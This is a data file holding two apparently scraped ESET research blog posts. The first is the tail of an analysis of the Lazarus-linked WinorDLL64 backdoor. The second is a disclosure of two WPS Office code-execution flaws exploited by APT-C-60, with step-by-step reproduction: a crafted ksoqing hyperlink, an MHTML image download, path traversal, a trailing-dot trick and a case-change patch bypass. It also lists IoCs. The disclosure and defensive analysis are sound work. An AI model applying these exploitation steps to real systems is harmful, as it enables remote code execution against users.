readable and used by VirusTotal, where one can see the product version and build ID (VS2010 build 30319), number and type of source/object files used ([LTCG C++] where LTCG stands for Link Time Code Generation, [ASM], [ C ]), and number of exports ([EXP]) in the rule: [LTCG C++] VS2010 build 30319 count=7 [EXP] VS2010 build 30319 count=1 [ASM] VS2010 build 30319 count=10 [ C ] VS2010 build 30319 count in [ 90 .. 108 ] - The GhostSecret article described “a unique data-gathering and implant-installation component that listens on port 443 for inbound control server connections” that additionally ran as a service.\nThis is an accurate description of Wslink downloader behavior, apart from the port number, which can vary based on the configuration.\nTo sum it up, even though the implementation is different, both serve the same purpose. -\nThe loader is virtualized by Oreans’ Code Virtualizer, which is a commercial protector that is used frequently by Lazarus. -\nThe loader uses the MemoryModule library to load modules directly from memory.\nThe library is not commonly used by malware, but it is quite popular among North Korea-aligned groups such as Lazarus and Kimsuky. -\nOverlap in the code between WinorDLL64 and GhostSecret that we found during our analysis.\nThe results and the significance in attribution are listed in Table 1.\nTable 1.\nSimilarities between WinorDLL64 and GhostSecret and their significance in attributing both to the same threat actor | Other similarities between WinorDLL64 and GhostSecret | Impact | |---|---| | Code overlap in code responsible to get processor architecture | Low | | Code overlap in current directory manipulation | Low | | Code overlap in getting the process list | Low | | Code overlap in file sending | Low | | Behavior overlap in listing processes | Low | | Behavior overlap in current directory manipulation | Low | | Behavior overlap in file and directory listing | Low | | Behavior overlap in listing volumes | Low | | Behavior overlap in reading/writing files | Low | | Behavior overlap in creating processes | Low | | Considerable behavior overlap in secure removal of files | Low | | Considerable behavior overlap in termination of processes | Low | | Considerable behavior overlap in collecting system information | Low | Code overlap in the file sending functionality is highlighted in Figure 2 and Figure 3.\nTechnical analysis WinorDLL64 serves as a backdoor that most notably acquires extensive system information, provides means for file manipulation, and executes additional commands.\nInterestingly, it communicates over a TCP connection that was already established by its loader and uses some of the loader’s functions.\nThe backdoor is a DLL with a single unnamed export that accepts one parameter – a structure for communication that was already described in our previous blogpost.\nThe structure contains a TLS-context – socket, key, IV – and callbacks for sending and receiving messages encrypted with 256-bit AES-CBC that enable WinorDLL64 to exchange data securely with the operator over an already established connection.\nThe following facts lead us to believe with high confidence that the library is indeed part of Wslink: - The unique structure is used everywhere in the expected way, e.g., the TLS-context and other meaningful parameters are supplied in the anticipated order to the correct callbacks. -\nThe name of the DLL is WinorDLL64.dll and Wslink’s name was WinorLoaderDLL64.dll.\nWinorDLL64 accepts several commands.\nFigure 5 displays the loop that receives and handles commands.\nEach command is bound to a unique ID and accepts a configuration that contains additional parameters.\nThe command list, with our labels, is in Figure 6.\nTable 2 contains a summary of the WinorDLL64 commands, where modified, and old categories refer to the relationship to the previously documented GhostSecret functionality.\nWe highlight only significant changes in the modified category.\nTable 2.\nOverview of backdoor commands | Category | Command ID | Functionality | Description | |---|---|---|---| | New | 0x03 | Execute a PowerShell command | WinorDLL64 instructs the PowerShell interpreter to run unrestricted and to read commands from standard input.\nAfterwards, the backdoor passes the specified command to the interpreter and sends the output to the operator.\n| | 0x09 | Compress and download a directory | WinorDLL64 recursively iterates over a specified directory.\nThe content of each file and directory is compressed separately and written to a temporary file that is afterwards sent to the operator and then removed securely.\n| | | 0x0D | Disconnect a session | Disconnects a specified logged-on user from the user’s Remote Desktop Services session.\nThe command can also perform different functionality based on the parameter.\n| | | 0x0D | List sessions | Acquires various details about all sessions on the victim’s device and sends them to the operator.\nThe command can also perform different functionality based on the parameter.\n| | | 0x0E | Measure connection time | Uses the Windows API GetTickCount to measure the time required to connect to a specified host.\n| | | Modified | 0x01 | Get system info | Acquires comprehensive details about the victim’s system and sends them to the operator.\n| | 0x0A | Remove files securely | Overwrites specified files with a block of random data, renames each file to a random name, and finally securely removes them one by one.\n| | | 0x0C | Kill processes | Terminates all processes whose names match a supplied pattern and/or with a specific PID.\n| | | Old | 0x02/0x0B | Create a process | Creates a process either as the current or specified user and optionally sends its output to the operator.\n| | 0x05 | Set/Get current directory | Attempts to set and subsequently acquire the path of the current working directory.\n| | | 0x06 | List volumes | Iterates over drives from C: to Z: and acquires the drive type and volume name.\nThe command can also perform different functionality based on the parameter.\n| | | 0x06 | List files in a directory | Iterates over files in specified directory and acquires information such as names, attributes, etc.\nThe command can also perform different functionality based on the parameter.\n| | | 0x07 | Write to a file | Downloads and appends the stated amount of data to specified file.\n| | | 0x08 | Read from a file | The specified file is read and sent to the operator.\n| | | 0x0C | List processes | Acquires details about all running processes on the victim’s device and additionally sends ID of the current process.\n| Conclusion Wslink’s payload is dedicated to providing means for file manipulation, execution of further code, and obtaining extensive information about the underlying system that possibly can be leveraged later for lateral movement, due to specific interest in network sessions.\nThe Wslink loader listens on a port specified in the configuration and can serve additional connecting clients, and even load various payloads.\nWinorDLL64 contains an overlap in the development environment, behavior, and code with several Lazarus samples, which indicates that it might be a tool from the vast arsenal of this North-Korea aligned APT group.\nESET Research offers private APT intelligence reports and data feeds.\nFor any inquiries about this service, visit the ESET Threat Intelligence page.\nIoCs | SHA-1 | ESET detection name | Description | |---|---|---| | 1BA443FDE984CEE85EBD4D4FA7EB1263A6F1257F | Win64/Wslink.\nA | Memory dump of discovered Wslink payload WinorDll64.\n| MITRE ATT&CK techniques This table was built using version 12 of the ATT&CK framework.\nWe do not mention techniques from the loader again, only the payload.\n| Tactic | ID | Name | Description | |---|---|---|---| | Resource Development | T1587.001 | Develop Capabilities: Malware | WinorDLL64 is a custom tool.\n| | Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | WinorDLL64 can execute arbitrary PowerShell commands.\n| | T1106 | Native API | WinorDLL64 can execute further processes using the CreateProcessW and CreateProcessAsUserW APIs.\n| | | Defense Evasion | T1134.002 | Access Token Manipulation: Create Process with Token | WinorDLL64 can call APIs WTSQueryUserToken and CreateProcessAsUserW to create a process under an impersonated user.\n| | T1070.004 | Indicator Removal: File Deletion | WinorDLL64 can securely remove arbitrary files.\n| | | Discovery | T1087.001 | Account Discovery: Local Account | WinorDLL64 can enumerate sessions and list associated user, and client names, among other details.\n| | T1087.002 | Account Discovery: Domain Account | WinorDLL64 can enumerate sessions and list associated domain names –among other details.\n| | | T1083 | File and Directory Discovery | WinorDLL64 can obtain file and directory listings.\n| | | T1135 | Network Share Discovery | WinorDLL64 can discover shared network drives.\n| | | T1057 | Process Discovery | WinorDLL64 can collect information about running processes.\n| | | T1012 | Query Registry | WinorDLL64 can query the Windows registry to gather system information.\n| | | T1082 | System Information Discovery | WinorDLL64 can obtain information such as computer name, OS and latest service pack version, processor architecture, processor name, and amount of space on fixed drives.\n| | | T1614 | System Location Discovery | WinorDLL64 can obtain the victim’s default country name using the GetLocaleInfoW API.\n| | | T1614.001 | System Location Discovery: System Language Discovery | WinorDLL64 can obtain the victim’s default language using the GetLocaleInfoW API.\n| | | T1016 | System Network Configuration Discovery | WinorDLL64 can enumerate network adapter information.\n| | | T1049 | System Network Connections Discovery | WinorDLL64 can collect a list of listening ports.\n| | | T1033 | System Owner/User Discovery | WinorDLL64 can enumerate sessions and list associated user, domain, and client names –among other details.\n| | | Collection | T1560.002 | Archive Collected Data: Archive via Library | WinorDLL64 can compress and exfiltrate directories using the quicklz library.\n| | T1005 | Data from Local System | WinorDLL64 can collect data on the victim’s device.\n| | | Impact | T1531 | Account Access Removal | WinorDLL64 can disconnect a logged-on user from specified sessions.\n|","num_sentences":103,"metadata":{"source":"blog","platform":"welivesecurity","filename":"winordll64"}}
{"id":218,"title":"Analysis of two arbitrary code execution vulnerabilities affecting WPS Office","publish_date":"2024-08-28","link":"https://www.welivesecurity.com/en/eset-research/analysis-of-two-arbitrary-code-execution-vulnerabilities-affecting-wps-office/","clean_text":"ESET researchers discovered a code execution vulnerability in WPS Office for Windows (CVE-2024-7262), as it was being exploited by APT-C-60, a South Korea-aligned cyberespionage group.\nUpon analyzing the root cause, we subsequently discovered another way to exploit the faulty code (CVE-2024-7263).\nFollowing a coordinated disclosure process, both vulnerabilities are now patched – in this blogpost, we provide technical details.\nKey points of the blogpost: - APT-C-60 weaponized a code execution vulnerability in WPS Office for Windows (CVE-2024-7262) in order to target East Asian countries. -\nA root cause analysis of this vulnerability is provided along with a description of its weaponization. -\nThe study of the exploit led ESET researchers to the discovery of an alternative path to exploit the vulnerability (CVE-2024-7263).\nOverview While investigating APT-C-60 activities, we found a strange spreadsheet document referencing one of the group’s many downloader components.\nOur analysis led us to the discovery of a code execution vulnerability in WPS Office for Windows being exploited in the wild by APT-C-60 to target East Asian countries.\nThe final payload is a custom backdoor we internally named SpyGlace, publicly documented by ThreatBook as TaskControler.dll.\nAccording to the WPS website, this software has over 500 million active users worldwide, which makes it a good target to reach a substantial number of individuals in the East Asia region.\nDuring our coordinated vulnerability disclosure process, DBAPPSecurity independently published an analysis of the weaponized vulnerability and confirmed that APT-C-60 has exploited the vulnerability to deliver malware to users in China.\nThe malicious document (SHA-1: 7509B4C506C01627C1A4C396161D07277F044AC6) comes as an MHTML export of the commonly used XLS spreadsheet format.\nHowever, it contains a specially crafted and hidden hyperlink designed to trigger the execution of an arbitrary library if clicked when using the WPS Spreadsheet application.\nThe rather unconventional MHTML file format allows a file to be downloaded as soon as the document is opened; therefore, leveraging this technique while exploiting the vulnerability provides for remote code execution.\nFigure 1 shows how the document is displayed in WPS Spreadsheet: an image of rows and columns referencing the Coremail email solution, used as a decoy.\nThe image hides the malicious hyperlink.\nFollowing our coordinated vulnerability disclosure policy, from the moment the weaponized document was uploaded to VirusTotal to the release of this blogpost, the following timeline was observed: - 2024-02-29: The exploit document for CVE-2024-7262 was uploaded to VirusTotal. -\n2024-03-??:\nKingsoft released an update that silently patched the CVE-2024-7672 vulnerability so that the 2024-02-29 exploit no longer worked.\nThis was determined retrospectively, by analyzing all accessible WPS Office releases between 2024-03 and 2024-04, as Kingsoft was not especially forthcoming in providing precise details of its actions when attempting to repair this vulnerability. -\n2024-04-30: We analyzed the malicious document from VirusTotal and discovered it was actively exploiting CVE-2024-7262, which was a zero-day vulnerability at the time of the document’s initial use.\nWe also discovered that Kingsoft’s silent patch addressed only one part of the faulty code, and the remaining flawed code was still exploitable. -\n2024-05-25: We contacted Kingsoft to report our findings.\nWhile the first vulnerability was already patched, we asked if they could create a CVE entry and/or a public statement as they had for CVE-2022-24934. -\n2024-05-30: Kingsoft acknowledged the vulnerabilities and told us they would keep us updated. -\n2024-06-17: We asked for an update. -\n2024-06-22: Kingsoft told us the development team was still working on it and was aiming to fix this in the coming version. -\n2024-07-31: Based on later tests, we found that CVE-2024-7263 was silently patched.\nWe advised Kingsoft that we had reserved and were preparing CVE-2024-7262 and CVE-2024-7263. -\n2024-08-11: DBAPPSecurity team independently published its findings. -\n2024-08-15: CVE-2024-7262 and CVE-2024-7263 were published. -\n2024-08-16: We asked Kingsoft for another update. -\n2024-08-22: Kingsoft acknowledged it had fixed CVE-2024-7263 by the end of May, which contradicts the company’s claim on 2024-06-22 that its development team “are still working on it”. -\n2024-08-28: Kingsoft has acknowledged both vulnerabilities and that it has patched both.\nHowever, it has expressed no interest in publicizing the in-the-wild exploitation of CVE-2024-7262 so we are now publishing this blogpost to warn Kingsoft’s customers that they should urgently update WPS Office due to in-the-wild exploitation and third-party disclosure of the CVE-2024-7262 vulnerability and exploit, which increase the chances of further exploitation.\nThe CVE-2024-7262 vulnerability stemmed from the lack of sanitization of an attacker-provided file path and lack of validation of the plugin being loaded.\nAfter analyzing its patch, we discovered another way to exploit the vulnerability by leveraging a further logic bug.\nCVE-2024-7262 This section describes the bug exploited by APT-C-60 that allows code execution via hijacking the control flow of the WPS Office plugin component promecefpluginhost.exe.\nWe also explain how the vulnerability was triggered and weaponized in the shape of a legitimate-looking spreadsheet document.\nRoot cause analysis When installing WPS Office for Windows, the software suite registers a custom protocol handler called ksoqing that allows the execution of an external application whenever a user clicks on a URL starting with the URI scheme ksoqing://. In the Windows operating system, the registration of a custom protocol handler is done in the registry.\nIn this case, the default value under the key HKCR\\ksoqing\\shell\\open\\command directs Windows to execute C:\\Users\\ Figure 3 provides an overview of the control flow of the exploit for CVE-2024-7262.\nOnce launched, wps.exe loads qingbangong.dll, the component responsible for parsing and validating certain parameters from the hyperlink.\nThe malicious link in the exploit file we found has the following format ksoqing://type=ksolaunch&cmd= The token parameter is the MD5 hash of the encoded value of the cmd parameter concatenated with the string _qingLaunchKey_ followed by the encoded value of the launchname parameter.\nThe last one must be an executable located under C:\\Users\\ After decoding the cmd parameter, we found that the command line /qingbangong -CefParentID=1 -JSCefServicePath= Essentially, it is possible to abuse the ksoqing scheme protocol and create a hyperlink that when clicked will load a library from a given remote file path.\nAPT-C-60 weaponized the vulnerability to execute its first-stage trojan downloader component (SHA-1: 08906644B0EF1EE6478C45A6E0DD28533A9EFC29).\nExploiting the vulnerability In order to exploit this vulnerability, an attacker would need to store a malicious library somewhere accessible by the targeted computer either on the system or on a remote share, and know its file path in advance.\nThe exploit developers of this vulnerability knew a couple of tricks that helped them achieve this.\nLeveraging the MHTML format to download remote files The authors of the exploit chose to leverage a specific feature of the supported MHTML file format to have their malicious component downloaded and stored on the system in a predictable way.\nThis particular type of file is an export format offered by Microsoft Word and Excel applications to allow users to view documents in their browser.\nIt is a multipart archive containing HTML, CSS, and JavaScript files that facilitate the display of the document.\nBy inserting an img tag inside one of the HTML files, it is possible to make the Spreadsheet application download a remote file when the document is being loaded.\nFor instance, Figure 5 shows one of our test files with the img tag and its src element pointing to a library stored locally.\nWhen opening the spreadsheet document with the WPS Spreadsheet et.exe application, the remote library is automatically downloaded and stored on disk, as observed using ProcMon shown in Figure 6.\nFinding a predictable file path As for the predictable file path problem, we found that the downloaded files are stored under %localappdata%\\Temp\\wps\\INetCache\\ and the filename is the MD5 hash of the URL encoded in UTF‑16LE.\nFor instance, our URL was http://localhost/Dll1.dll for which the MD5 hash is 914CBE6372D5B7C93ADDC4FEB5E964CD.\nHowever, when trying to set the variable JSCefServicePath to point to such a file path, it gets concatenated to the root directory of the WPS Office application located under %localappdata%\\Kingsoft\\WPS Office\\ However, it is possible to use a relative path from the root directory of the WPS Office application, such as ..\\..\\..\\..\\Temp\\wps\\INetCache\\914cbe6372d5b7c93addc4feb5e964cd.\nThe file extension problem There’s a last obstacle to overcome.\nAn astute reader would have probably noticed that the .dll extension gets appended to the filename when the promecefpluginhost.exe process tries to load the library.\nAs seen in Figure 6, the extension is not appended when the downloaded file is created.\nThe authors of the exploit, once again, used their knowledge of the Windows API to bypass this restriction.\nAs mentioned earlier, the QLibrary::Load method is responsible for loading the library which in turn calls LoadLibraryW. The documentation for the lpLibFileName parameter passed to this function states that adding a trailing dot character (.)\nprevents the function from appending the .dll extension.\nTherefore, appending this character to the relative path would allow our library to get loaded.\nReproducing the exploit When putting it all together, in order to reproduce the exploit, we followed these steps: - Host a custom library on a web server. -\nCompute the MD5 hash of the URL. -\nBuild the corresponding hyperlink. -\nCreate a spreadsheet document, insert the hyperlink, and export it as an MHTML file. -\nInsert an img tag inside the exported file to point to the URL.\nFigure 8 illustrates how to build the hyperlink.\nAfter opening the document, a single click on the hyperlink triggered the vulnerability and our custom library was loaded as shown in Figure 9 and, in more detail, in Figure 10.\nWhen loaded, our custom library writes the PID, the presence of admin privileges, and the file path of the hosting process to a log file.\nWe reproduced the exploit for different versions of WPS Office for Windows as illustrated in Figure 11.\nSince this is a one-click vulnerability, the exploit developers embedded a picture of the spreadsheet’s rows and columns inside the spreadsheet in order to deceive and convince the user that the document is a regular spreadsheet.\nThe malicious hyperlink was linked to the image so that clicking on a cell in the picture would trigger the exploit, as reproduced in Figure 12.\nAnother interesting fact about this vulnerability is that it can also be triggered via a single click in the preview pane in Windows Explorer, which makes it even more dangerous.\nAffected versions The affected versions of WPS Office for Windows range from 12.2.0.13110, released around August 2023 until the release of the patch in March 2024 with version 12.1.0.16412.\nThe weaponized document was first uploaded to VirusTotal in February; some malicious components, given their PE timestamp, were built in February.\nCVE-2024-7263 This section provides an analysis of the patch for CVE-2024-7262 and the resulting discovery of another code execution vulnerability via hijacking the control flow of the same WPS Office plugin component: promecefpluginhost.exe.\nRoot cause analysis During the process of figuring out which versions were affected by the first vulnerability, we analyzed the patch that was silently introduced in version 12.1.0.16412 (released around March 2024) to mitigate CVE-2024-7262.\nEssentially, additional checks were put inside the promecefpluginhost.exe and ksojscore.dll components to verify the attacker-controlled variable JSCefServicePath.\nHowever, a similar variable was not covered by the patch: CefPluginPathU8.\nThe first check happens when promecefpluginhost.exe iterates over its different command line arguments.\nIf a parameter has the same name (case sensitive comparison) as one of the aforementioned variables, the parameter is discarded as shown in Figure 13.\nAfter that, it retrieves the expected file path for JSCefServicePath where jscefservice.dll is supposed to be stored.\nThe real path should be %LOCALAPPDATA%\\Kingsoft\\WPS Office\\ A new command line is built with the accepted command line parameters, followed by the retrieved file paths identified by the named variables.\npromecefpluginhost.exe then loads the library ksojscore.dll and its export CefRenderEntryPoint is called with the rebuilt command line.\nBoth named variables are checked but this time the comparison is case insensitive (see line 2 in Figure 15).\nHere lies the first logic flaw.\nIf at least one letter of the named variables is changed to its uppercase or lowercase counterpart, the first (case-sensitive) check will not result in the attacker-specified parameter being rejected, and the command line will look like the following (for example): -JSCEfServicePath= When such a command line is passed to ksojscore.dll, it will only take the first occurrence of the variable and the attacker-controlled variable is always placed before the valid ones.\nHowever, before loading the library given by the JSCefServicePath file path, a second check was introduced.\nThe function krt::ksafe::KProcess::verifyZhuHaiKingsoftCertSigner is called to check the certificate of the library and make sure that it is a library belonging to Kingsoft, as shown in Figure 16.\nSo, an attacker cannot load any arbitrary library.\nHowever, the CefPluginPathU8 variable is not checked correctly.\nHere lies the second flaw.\nAfter verifying the JSCefServicePath file path, the library jscefservice.dll is loaded and calls LoadLibraryExW with the file path provided by CefPluginPathU8 concatenated with the string \\libcef.dll without checking its signature.\nIf at least one letter of the variable CefPluginPathU8 is changed, jscefservice.dll will try to load the libcef.dll library stored under the attacker-controlled file path given by the variable, as observed in Figure 17.\nExploiting the vulnerability The main constraint of this vulnerability is the string libcef.dll that is appended to the file path.\nAs of the writing of this blogpost, we haven't found a way to download a file and choose its filename.\nHowever, on a local network, hosting a library on a share and having the variable CefPluginPathU8 point to it works because LoadLibraryExW allows network paths to be specified.\nThe screenshot shown in Figure 18 illustrates how the control flow of promecefpluginhost.exe (version 12.2.0.16909 released late April 2024) was hijacked using a network path.\nAffected versions The affected versions of WPS Office for Windows range from 12.2.0.13110, released around August 2023, until the release of the patch at the end of May 2024 with version 12.2.0.17119.\nConclusion As WPS Office is a software suite mostly distributed in Asia, APT-C-60 demonstrated just how much it is determined to compromise targets in East Asian countries.\nWhether the group developed or bought the exploit for CVE-2024-7262, it definitely required some research into the internals of the application but also knowledge of how the Windows loading process behaves.\nThe exploit is cunning as it is deceptive enough to trick any user into clicking on a legitimate-looking spreadsheet while also being very effective and reliable.\nThe choice of the MHTML file format allowed the attackers to turn a code execution vulnerability into a remote one.\nAdditionally, our discovery of CVE-2024-7263 underlines the importance of a careful patch verification process and making sure the core issue has been addressed in full.\nWe strongly advise WPS Office for Windows users to update their software to the latest release.\nFor any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com.\nESET Research offers private APT intelligence reports and data feeds.\nFor any inquiries about this service, visit the ESET Threat Intelligence page.\nIoCs Files | SHA-1 | Filename | Detection | Description | | 7509B4C506C01627C1A4 | input.htm | HTML/Agent.\nHQ | MHTML-formatted WPS Spreadsheet exploit – CVE‑2024‑7262.\n| | 08906644B0EF1EE6478C | WPS_TEST_DLL.dll | Win32/TrojanDownloader.\n| Downloader component.\n| Network | IP | Domain | Hosting provider | First seen | Details | | 162.222.214[.]48 131.153.206[.]231 | rammenale[.]com | PhoenixNAP | 2024-03-08 | C&C server hosting next stages.\n| MITRE ATT&CK Techniques This table was built using version 15 of the MITRE ATT&CK framework.\n| Tactic | ID | Name | Description | | Resource Development | Domains | APT-C-60 acquired a domain name for its C&C server.\n| | | Server | APT-C-60 acquired a server for its C&C. | || | Upload Malware | APT-C-60’s next stages were uploaded to its C&C server.\n| || | Exploits | APT-C-60 developed or purchased an exploit for CVE-2024-7262.\n| || | Execution | Exploitation for Client Execution | APT-C-60 exploited CVE-2024-7262 to achieve execution.\n| | | Malicious Link | The exploit used by APT-C-60 requires a click on a hyperlink.\n|","num_sentences":122,"metadata":{"source":"blog","platform":"welivesecurity","filename":"wps-office"}}
